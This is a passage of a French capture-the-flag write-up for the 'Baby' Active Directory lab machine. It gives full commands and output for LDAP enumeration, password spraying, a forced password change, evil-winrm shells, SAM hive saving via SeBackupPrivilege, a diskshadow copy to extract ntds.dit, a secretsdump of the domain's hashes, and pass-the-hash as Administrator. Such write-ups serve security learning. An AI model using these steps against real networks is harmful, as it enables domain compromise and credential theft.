+<h3 id="ldap---tcp-389">LDAP - TCP 389</h3>
+<p>J&rsquo;arrive à m&rsquo;authentifier avec LDAP et à lister les utilisateurs du domaine. Je vois alors un message comme contenant le mot de passe <code>BabyStart123!</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nxc ldap babydc.baby.vl -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --users</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-2.png"
+        data-srcset="/images/Baby/Baby-2.png, /images/Baby/Baby-2.png 1.5x, /images/Baby/Baby-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-2.png"
+        title="/images/Baby/Baby-2.png" width="1920" height="532" /></p>
+<h2 id="shell-as-carolinerobinson">Shell as Caroline.Robinson</h2>
+<h3 id="password-spray">Password spray</h3>
+<p>Je teste alors ce mot de passe sur les utilisateurs recensés. Mais il n&rsquo;appartient à aucun d&rsquo;eux.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb babydc.baby.vl -u users.lst -p <span class="s1">&#39;BabyStart123!&#39;</span> --continue-on-success</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-3.png"
+        data-srcset="/images/Baby/Baby-3.png, /images/Baby/Baby-3.png 1.5x, /images/Baby/Baby-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-3.png"
+        title="/images/Baby/Baby-3.png" width="1913" height="404" /></p>
+<h3 id="user-enumeration">User enumeration</h3>
+<p>Même avec <code>ldapsearch</code>, je ne trouve toujours que cette liste d&rsquo;utilisateurs.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ldapsearch -H ldap://baby.vl -x -b <span class="s2">&#34;DC=BABY,DC=VL&#34;</span> -s sub <span class="s2">&#34;(&amp;(objectclass=user))&#34;</span>  <span class="p">|</span> grep <span class="s1">&#39;sAMAccountName:&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-4.png"
+        data-srcset="/images/Baby/Baby-4.png, /images/Baby/Baby-4.png 1.5x, /images/Baby/Baby-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-4.png"
+        title="/images/Baby/Baby-4.png" width="1461" height="344" /></p>
+<p>Je decide alors de récupérer tous les objets du domaines.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ldapsearch -H ldap://baby.vl -x -b <span class="s2">&#34;DC=BABY,DC=VL&#34;</span> -s sub <span class="s2">&#34;(&amp;(objectclass=*))&#34;</span> &gt; ldapsearch.out</span></span></code></pre></div></div>
+<p>En regardant le contenu du fichier, je remarque un utilisateur (<code>Ian Walker</code>) qui n’était pas présent lors de l’énumération d&rsquo;utilisateurs.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-5.png"
+        data-srcset="/images/Baby/Baby-5.png, /images/Baby/Baby-5.png 1.5x, /images/Baby/Baby-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-5.png"
+        title="/images/Baby/Baby-5.png" width="696" height="376" /></p>
+<p>Je continue pour voir s&rsquo;il y en a d&rsquo;autres. Je trouve alors un autre utilisateur : <code>Caroline Robinson</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-6.png"
+        data-srcset="/images/Baby/Baby-6.png, /images/Baby/Baby-6.png 1.5x, /images/Baby/Baby-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-6.png"
+        title="/images/Baby/Baby-6.png" width="599" height="86" /></p>
+<h3 id="change-carolines-password">Change Caroline&rsquo;s password</h3>
+<p>L&rsquo;erreur <code>STATUS_PASSWORD_MUST_CHANGE</code> est là pour indiquer que le mot de passe doit être modifié lors de la prochaine connexion de l&rsquo;utilisateur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-7.png"
+        data-srcset="/images/Baby/Baby-7.png, /images/Baby/Baby-7.png 1.5x, /images/Baby/Baby-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-7.png"
+        title="/images/Baby/Baby-7.png" width="1914" height="465" /></p>
+<p>A l&rsquo;aide du module <code>change-password</code> de <code>netexec</code>, je peux changer le mot de passe d&rsquo;un utilisateur. En tant qu&rsquo;utilisateur anonyme, je n&rsquo;ai pas suffisamment de droits pour changer  le mot de passe de Caroline.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb babydc.baby.vl -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -M change-password -o <span class="nv">USER</span><span class="o">=</span>Caroline.Robinson <span class="nv">NEWPASS</span><span class="o">=</span>Password123</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-8.png"
+        data-srcset="/images/Baby/Baby-8.png, /images/Baby/Baby-8.png 1.5x, /images/Baby/Baby-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-8.png"
+        title="/images/Baby/Baby-8.png" width="1920" height="346" /></p>
+<p>Mais je peux le faire avec les identifiants actuels car, je peux me connecter avec ces derniers.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc smb babydc.baby.vl -u <span class="s1">&#39;Caroline.Robinson&#39;</span> -p <span class="s1">&#39;BabyStart123!&#39;</span> -M change-password -o <span class="nv">NEWPASS</span><span class="o">=</span>Password123</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-9.png"
+        data-srcset="/images/Baby/Baby-9.png, /images/Baby/Baby-9.png 1.5x, /images/Baby/Baby-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-9.png"
+        title="/images/Baby/Baby-9.png" width="1920" height="244" /></p>
+<p>Le changement de mot de passe est effectif.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  nxc winrm babydc.baby.vl -u Caroline.Robinson -p <span class="s1">&#39;Password123&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM       10.129.195.51   <span class="m">5985</span>   BABYDC           <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> <span class="o">(</span>name:BABYDC<span class="o">)</span> <span class="o">(</span>domain:baby.vl<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.129.195.51   <span class="m">5985</span>   BABYDC           <span class="o">[</span>+<span class="o">]</span> baby.vl<span class="se">\C</span>aroline.Robinson:Password123 <span class="o">(</span>admin<span class="o">)</span></span></span></code></pre></div></div>
+<h3 id="evil-winrm">evil-winrm</h3>
+<p>Je peux donc avoir un shell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i babydc.baby.vl -u Caroline.Robinson -p <span class="s1">&#39;Password123&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-10.png"
+        data-srcset="/images/Baby/Baby-10.png, /images/Baby/Baby-10.png 1.5x, /images/Baby/Baby-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-10.png"
+        title="/images/Baby/Baby-10.png" width="1021" height="650" /></p>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="sebackupprivilege">SeBackupPrivilege</h3>
+<p><code>Caroline.Robinson</code> est membre du groupe <code>Backup Operators</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-11.png"
+        data-srcset="/images/Baby/Baby-11.png, /images/Baby/Baby-11.png 1.5x, /images/Baby/Baby-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-11.png"
+        title="/images/Baby/Baby-11.png" width="1898" height="502" /></p>
+<p>Elle dispose aussi du privilège <code>SeBackupPrivilege</code>. Cela lui permet de lire tous les fichiers du système. Je peux donc abuser de cela pour lire la SAM.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-12.png"
+        data-srcset="/images/Baby/Baby-12.png, /images/Baby/Baby-12.png 1.5x, /images/Baby/Baby-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-12.png"
+        title="/images/Baby/Baby-12.png" width="843" height="392" /></p>
+<p>Je me suis servi de cet article de <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank" rel="noopener noreffer ">hackingarticles</a> pour exploiter ce privilège.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Récupérer la SAM et SYSTEM</span>
+</span></span><span class="line"><span class="cl"><span class="n">mkdir</span> <span class="n">c:</span><span class="p">\</span><span class="n">temp</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="n">c:</span><span class="p">\</span><span class="n">temp</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">c:</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">sam</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c:</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Téléchager la SAM et SYSTEM</span>
+</span></span><span class="line"><span class="cl"><span class="n">download</span> <span class="n">sam</span>
+</span></span><span class="line"><span class="cl"><span class="n">download</span> <span class="n">system</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-13.png"
+        data-srcset="/images/Baby/Baby-13.png, /images/Baby/Baby-13.png 1.5x, /images/Baby/Baby-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-13.png"
+        title="/images/Baby/Baby-13.png" width="1781" height="663" /></p>
+<p>Puis à l&rsquo;aide de <code>pypykatz</code>, je lis le contenu de la SAM.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pypykatz registry --sam sam system</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-14.png"
+        data-srcset="/images/Baby/Baby-14.png, /images/Baby/Baby-14.png 1.5x, /images/Baby/Baby-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-14.png"
+        title="/images/Baby/Baby-14.png" width="1104" height="395" /></p>
+<p>Le hash de l&rsquo;administrateur n&rsquo;est pas valide.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb babydc.baby.vl -u administrator -H 8d992faed38128ae85e95fa35868bb43
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:BABYDC<span class="o">)</span> <span class="o">(</span>domain:baby.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>-<span class="o">]</span> baby.vl<span class="se">\a</span>dministrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE</span></span></code></pre></div></div>
+<h3 id="shadow-copy">Shadow Copy</h3>
+<p>Je décide alors de télécharger le fichier <code>ntds.dit</code> qui est une base de données Active Directory qui stocke les informations du domaine y compris des hash des utilisateurs.. Ce fichier ne peux être copier simplement. Pour cela, il me faut créer utiliser la technique du <code>Shadow Copy</code>.
+Pour simplifier le processus, nous allons créer un fichier Shell distribué (fichier <code>.dsh</code>). Ce fichier contiendra toutes les commandes nécessaires à l&rsquo;exécution de <code>DiskShadow</code> et créera une copie complète de notre disque Windows. Une fois cette copie créée, nous pourrons l&rsquo;utiliser pour extraire le fichier <code>ntds.dit</code>.
+Ensuite j&rsquo;utilise l&rsquo;outil <a href="https://manpages.debian.org/testing/dos2unix/unix2dos.1.fr.html" target="_blank" rel="noopener noreffer ">unix2dos</a> pour le rendre compatible au format Windows.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-16.png"
+        data-srcset="/images/Baby/Baby-16.png, /images/Baby/Baby-16.png 1.5x, /images/Baby/Baby-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-16.png"
+        title="/images/Baby/Baby-16.png" width="631" height="327" /></p>
+<p>Une fois terminé, je l&rsquo;uploade sur la machine cible. Puis j&rsquo;utilise l&rsquo;outil intégré à Windows <code>diskshadow</code> pour créer une copie du disque en cours d&rsquo;utilisation.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">baby</span><span class="p">.</span><span class="py">dsh</span>
+</span></span><span class="line"><span class="cl"><span class="n">diskshadow</span> <span class="p">/</span><span class="n">s</span> <span class="n">baby</span><span class="p">.</span><span class="n">dsh</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-17.png"
+        data-srcset="/images/Baby/Baby-17.png, /images/Baby/Baby-17.png 1.5x, /images/Baby/Baby-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-17.png"
+        title="/images/Baby/Baby-17.png" width="1746" height="879" /></p>
+<p>Ensuite avec <code>robocopy</code>, je récupère le fichier <code>ntds.dit</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">robocopy</span> <span class="p">/</span><span class="n">b</span> <span class="n">z:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span> <span class="p">.</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-18.png"
+        data-srcset="/images/Baby/Baby-18.png, /images/Baby/Baby-18.png 1.5x, /images/Baby/Baby-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-18.png"
+        title="/images/Baby/Baby-18.png" width="952" height="548" /></p>
+<p>Je télécharge ensuite le fichier <code>ntds.dit</code> pour lire son contenu sur localement.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Baby/Baby-20.png"
+        data-srcset="/images/Baby/Baby-20.png, /images/Baby/Baby-20.png 1.5x, /images/Baby/Baby-20.png 2x"
+        data-sizes="auto"
+        alt="/images/Baby/Baby-20.png"
+        title="/images/Baby/Baby-20.png" width="1754" height="901" /></p>
+<p>Une fois le fichier <code>ntds.dit</code> sur ma machine, je peux lire son contenu avec <code>secretsdump</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  secretsdump -ntds ntds.dit -system system LOCAL
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Searching <span class="k">for</span> pekList, be patient
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> PEK <span class="c1"># 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reading and decrypting hashes from ntds.dit
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\J</span>acqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\A</span>shley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\H</span>ugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\L</span>eonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\I</span>an.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\C</span>onnor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\J</span>oseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\K</span>erry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\T</span>eresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
+</span></span><span class="line"><span class="cl">baby.vl<span class="se">\C</span>aroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::</span></span></code></pre></div></div>
+<p>Ce hash est valide.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb babydc.baby.vl -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:BABYDC<span class="o">)</span> <span class="o">(</span>domain:baby.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>-<span class="o">]</span> Error checking <span class="k">if</span> user is admin on 10.129.195.51: The NETBIOS connection with the remote host timed out.
+</span></span><span class="line"><span class="cl">SMB         10.129.195.51   <span class="m">445</span>    BABYDC           <span class="o">[</span>+<span class="o">]</span> baby.vl<span class="se">\a</span>dministrator:ee4457ae59f1e3fbd764e33d9cef123d</span></span></code></pre></div></div>
+<h3 id="evil-winrm-1">evil-winrm</h3>
+<p>Je peux donc avoir un shell.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Baby
+</span></span><span class="line"><span class="cl">╰─➤  evil-winrm -i babydc.baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls ../desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\d</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-ar---         10/2/2025   3:54 PM             <span class="m">34</span> root.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">type*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../desktop/root.txt
+</span></span><span class="line"><span class="cl">4672d*****************************</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/baby/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/baby/" data-title="Baby" data-via="z3rodol" data-hashtags="Easy,Windows,Active Directory,SeBackupPrivilege,ADCS,Shadow Copy"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/sebackupprivilege/">SeBackupPrivilege</a>,&nbsp;<a href="/tags/adcs/">ADCS</a>,&nbsp;<a href="/tags/shadow-copy/">Shadow Copy</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/build/" class="prev" rel="prev" title="Build"><i class="fas fa-angle-left" aria-hidden="true"></i>Build</a>
+            <a href="/certified/" class="next" rel="next" title="Certified">Certified<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
